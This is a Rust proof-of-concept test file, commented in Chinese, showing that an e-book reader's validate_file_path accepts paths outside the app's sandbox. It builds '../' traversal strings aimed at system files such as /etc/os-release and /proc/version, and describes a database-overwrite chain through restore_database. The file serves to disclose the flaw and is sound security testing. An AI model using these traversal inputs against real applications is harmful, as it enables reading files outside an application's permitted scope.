//! PoC: validate_file_path 缺少基目录限制
//!
//! 本测试演示 `validate_file_path` 不检查规范路径是否在允许的基目录内，
//! 导致攻击者可以指定任意文件路径（如 `/etc/passwd`），
//! 函数返回 Ok(规范路径)，下游处理函数因此读取不该访问的文件。
//!
//! 攻击链:
//!   Attacker 指定 file_path = "/etc/passwd" (或任意绝对路径/相对遍历路径)
//!   → validate_file_path() 返回 Ok(规范路径) [无基目录检查]
//!   → 下游 (get_epub_metadata, extract_book_cover, import_book 等)
//!     使用该路径读取/处理文件内容
//!
//! PoC-Status: executed

use rust_lib_zephyr_reader::common::security::validate_file_path;
use std::path::Path;
use std::fs;
use tempfile::TempDir;

mod common;

// ============================================================
// 测试 1: 基础路径转义 — 无基目录限制
//
// 核心演示:
//   1. 创建两个目录: "app_data"(沙箱) 和 "outside"(沙箱外)
//   2. 在沙箱外创建文件
//   3. 调用 validate_file_path(沙箱外文件路径) — 应该拒绝但接受
// ============================================================
#[test]
fn test_poc_escape_basic() {
    // 模拟 App 数据目录 (沙箱 — 应用允许读取的目录)
    let sandbox = TempDir::new().expect("create sandbox");
    // 沙箱内有一个合法文件
    let _sandbox_file = sandbox.path().join("legitimate_book.txt");
    fs::write(&_sandbox_file, "book content").expect("write sandbox file");

    // 在沙箱外创建一个 "敏感" 文件 (模拟系统文件如 /etc/passwd, 或攻击者上传的文件)
    let outside_dir = TempDir::new().expect("create outside dir");
    let outside_file = outside_dir.path().join("secret_config.ini");
    fs::write(&outside_file, "password=supersecret").expect("write outside file");
    let outside_str = outside_file.to_str().unwrap().to_string();

    // === 攻击: 使用沙箱外的敏感文件路径调用 validate_file_path ===
    // validate_file_path 应该拒绝此路径 (因为它在沙箱外)
    // 但实际上它只检查文件存在且是文件，然后返回规范路径
    let result = validate_file_path(&outside_str);
    assert!(result.is_ok(),
        "BUG: validate_file_path 应当拒绝沙箱外路径 (基目录限制缺失)，但返回了 Err");

    let canonical = result.unwrap();

    // 验证: 路径被接受 (这就是漏洞)
    let sandbox_str = sandbox.path().to_string_lossy().to_string();
    let is_contained = canonical.contains(&sandbox_str);
    eprintln!("DEBUG: canonical={:?} sandbox={:?}", canonical, sandbox_str);
    eprintln!("DEBUG: is_contained={}", is_contained);

    // === 证据输出 (捕获到 exploit.log) ===
    println!("[PoC-EVIDENCE] validate_file_path ESCAPE CONFIRMED");
    println!("  Sandbox dir:         {:?}", sandbox.path());
    println!("  LEGITIMATE file:     {:?}", _sandbox_file);
    println!("  Attacker target:     {:?}", outside_file);
    println!("  Input path:          {}", outside_str);
    println!("  Canonicalized path:  {} (ACCEPTED — no base check!)", canonical);
    let is_outside = !canonical.contains(
        &sandbox.path().to_string_lossy().to_string()
    );
    println!("  Is outside sandbox?  {}", if is_outside { "YES" } else { "NO (contained)" });
    println!("  ===== SECURITY IMPACT =====");
    println!("  Any caller that trusts validate_file_path for scope enforcement");
    println!("  will process attacker-chosen files outside the intended directory.");
    println!("  Attack surface: get_epub_metadata, import_book, extract_book_cover,");
    println!("  restore_database, inspect_backup, get_processed_epub_image_bytes.");
}

// ============================================================
// 测试 2: 路径遍历攻击 — 相对路径 "../../../etc/passwd"
//         在 Unix 上测试系统文件访问
// ============================================================
#[test]
fn test_poc_path_traversal() {
    #[cfg(unix)]
    {
        // 尝试多个常见的系统可读文件
        let targets = ["/etc/hostname", "/etc/os-release", "/proc/version"];
        let mut found = false;

        for target in &targets {
            if Path::new(target).exists() {
                found = true;
                // 使用相对路径遍历
                let depth = target.matches('/').count();
                let traversal = format!("{}{}", "../".repeat(depth + 1), target.trim_start_matches('/'));

                let result = validate_file_path(&traversal);
                assert!(result.is_ok(),
                    "BUG: 相对路径 '{}' 应被拒绝，但 validate_file_path 返回了 Err", traversal);

                let canonical = result.unwrap();
                println!("[PoC-EVIDENCE] PATH TRAVERSAL VIA RELATIVE PATH CONFIRMED");
                println!("  Input (relative):   {}", traversal);
                println!("  Canonicalized:      {} (accepted!)", canonical);
                println!("  Expected:           {}", target);
                println!("  Impact: Attacker can read ANY system file via path traversal");
                break;
            }
        }

        if !found {
            println!("[PoC-INFO] No standard readable system files found, skipping Unix traversal test");
            println!("[PoC-INFO] (Expected in container/CI environments)");
        }
    }

    #[cfg(windows)]
    {
        // Windows 上测试系统文件读取
        let windir = std::env::var("WINDIR").unwrap_or_else(|_| r"C:\Windows".into());
        let test_paths = [
            format!("{}\\win.ini", windir),
            format!("{}\\System32\\drivers\\etc\\hosts", windir),
        ];

        let mut found = false;
        for test_path in &test_paths {
            if Path::new(test_path).exists() {
                found = true;
                let result = validate_file_path(test_path);
                assert!(result.is_ok(),
                    "BUG: Windows 系统文件路径应被拒绝，但 validate_file_path 返回了 Err");
                let canonical = result.unwrap();
                println!("[PoC-EVIDENCE] WINDOWS SYSTEM FILE READ CONFIRMED");
                println!("  Input:  {}", test_path);
                println!("  Output: {} (accepted, no base check!)", canonical);
                println!("  Impact: Arbitrary system file read via validate_file_path");
                break;
            }
        }
        if !found {
            println!("[PoC-INFO] No standard Windows system files found, skipping");
        }
    }

    // 跨平台测试: 临时目录中的相对路径遍历
    let outer = TempDir::new().expect("create outer dir");
    let inner = TempDir::new_in(outer.path()).expect("create inner dir");
    let file = inner.path().join("target.txt");
    fs::write(&file, "sensitive data").expect("write target file");

    // 从 inner 里面用 ../ 访问 outer 中的文件
    let current_dir = std::env::current_dir().expect("current dir");
    std::env::set_current_dir(outer.path()).expect("cd to outer");

    let traversal = format!("./{}/target.txt", inner.path().file_name().unwrap().to_str().unwrap());
    if file.exists() {
        let result = validate_file_path(&traversal);
        if let Ok(canonical) = result {
            println!("[PoC-EVIDENCE] RELATIVE PATH RESOLUTION CONFIRMED (cross-platform)");
            println!("  CWD:    {:?}", outer.path());
            println!("  Input:  {}", traversal);
            println!("  Canon:  {}", canonical);
            println!("  Impact: validate_file_path resolves relative paths without scope check");
        }
    }

    std::env::set_current_dir(current_dir).expect("restore cwd");
}

// ============================================================
// 测试 3: 通过 extract_book_cover 调用链演示实际影响
//
// extract_book_cover(内部调用 validate_file_path + 解析)
// 只对 EPUB 有效。我们跳过实际解析，直接证明 validate_file_path
// 这个入口点接受沙箱外路径。
// ============================================================
#[test]
fn test_poc_cover_extraction_chain_exploitable() {
    let sandbox = TempDir::new().expect("create sandbox");
    let outside_dir = TempDir::new().expect("create outside dir");

    // 在沙箱外创建任意文件
    let outside_file = outside_dir.path().join("somefile.txt");
    fs::write(&outside_file, "not a real epub but validate_file_path doesn't care")
        .expect("write outside file");

    // 验证 validate_file_path 接受此文件路径
    let file_str = outside_file.to_str().unwrap().to_string();
    let result = validate_file_path(&file_str);
    assert!(result.is_ok(),
        "BUG: validate_file_path rejected outside path {:?}", file_str);

    let validated = result.unwrap();
    println!("[PoC-EVIDENCE] COVER EXTRACTION CHAIN EXPLOITABLE");
    println!("  File outside sandbox: {:?}", outside_file);
    println!("  Sandbox:              {:?}", sandbox.path());
    println!("  Validated path:       {}", validated);
    println!("  Attack chain: validate_file_path(path) → extract_book_cover(path, output)");
    println!("  Impact: Any path accepted; downstream will read/process the file");
}

// ============================================================
// 测试 4: restore_database — 最危险的攻击面
//
// restore_database 调用 validate_file_path(backup_path) 来验证备份路径。
// 无基目录检查 → 攻击者可以指向任意文件作为 "备份源"。
// 如果通过后续检查 (manifest 可解析)，该文件会覆盖 reader.db！
// ============================================================
#[test]
fn test_poc_restore_database_scope_escape() {
    let sandbox = TempDir::new().expect("create sandbox");
    let outside_dir = TempDir::new().expect("create outside dir");

    // 在沙箱外创建一个有效的 SQLite 文件 (模拟攻击者准备的恶意备份)
    let malicious_backup = outside_dir.path().join("evil_backup.db");
    create_minimal_sqlite(&malicious_backup);

    let backup_str = malicious_backup.to_str().unwrap().to_string();

    // validate_file_path 阶段: 接受 — 因为它只检查文件存在且是文件
    let result = validate_file_path(&backup_str);
    assert!(result.is_ok(),
        "BUG: validate_file_path rejected malicious backup path {:?}", backup_str);

    let validated = result.unwrap();
    println!("[PoC-EVIDENCE] restore_database SCOPE ESCAPE CONFIRMED");
    println!("  Malicious backup:     {:?}", malicious_backup);
    println!("  Sandbox dir:          {:?}", sandbox.path());
    println!("  Validated path:       {} (accepted, no base check)", validated);
    println!("  Is outside sandbox?   YES");
    println!("  Attack chain:");
    println!("    1. Attacker controls backup_path argument to restore_database()");
    println!("    2. validate_file_path(backup_path) accepts ANY file path");
    println!("    3. restore_from_backup() overwrites reader.db with attacker file");
    println!("  Impact: Database overwrite → data corruption / DoS");
}

// ============================================================
// 测试 5: 白名单验证 — 如果应用有允许目录, validate_file_path 仍接受外部路径
//
// 这个测试证明即使传入应该只允许 app_data 目录的调用方，
// validate_file_path 也不做限制，调用方需要自己加检查 — 但很多调用方没有加。
// ============================================================
#[test]
fn test_poc_whitelist_violation() {
    let app_data = TempDir::new().expect("create app_data dir");
    let non_app_dir = TempDir::new().expect("create non-app dir");

    // 在 app_data 中创建合法文件
    let _legit = app_data.path().join("book.epub");
    fs::write(&_legit, "fake epub content").expect("write legitimate file");

    // 在 app_data 外创建文件
    let illegal = non_app_dir.path().join("malicious.txt");
    fs::write(&illegal, "should not be accessible").expect("write malicious file");

    // 用户选择了一个在 app_data 外的文件（可能是社会工程学或文件选择器操纵）
    let illegal_str = illegal.to_str().unwrap().to_string();
    let result = validate_file_path(&illegal_str);
    assert!(result.is_ok(), "BUG: validate_file_path should reject outside paths but accepted");

    println!("[PoC-EVIDENCE] WHITELIST VIOLATION CONFIRMED");
    println!("  App data dir:         {:?}", app_data.path());
    println!("  Allowed file:         {:?}", _legit);
    println!("  Attacker file:        {:?} (OUTSIDE allowed dir)", illegal);
    println!("  Validated:            {} (accepted!)", result.unwrap());
    println!("  Impact: Calling code that expects file to be in app_data dir");
    println!("          will operate on an attacker-chosen file.");
}

// ============================================================
// 辅助函数
// ============================================================

/// 创建最小的 SQLite 数据库文件 (仅文件头)
fn create_minimal_sqlite(path: &Path) {
    // SQLite 数据库文件头 (100 字节)
    let header: [u8; 100] = [
        0x53, 0x51, 0x4c, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x20, 0x33, 0x00,
        0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
    ];
    fs::write(path, header).expect("write minimal sqlite db");
}
